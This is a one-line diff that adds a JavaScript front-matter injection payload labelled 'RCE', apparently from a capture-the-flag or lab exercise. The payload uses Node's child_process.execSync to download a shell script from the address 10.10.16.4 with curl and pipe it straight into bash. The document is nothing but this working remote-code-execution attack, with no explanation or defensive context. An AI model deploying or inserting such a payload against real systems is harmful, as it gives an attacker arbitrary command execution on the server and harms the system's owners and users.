@@ -1,0 +1,1 @@
+---js\n((require("child_process")).execSync("curl 10.10.16.4/game.sh -o - | bash"))\n---RCE
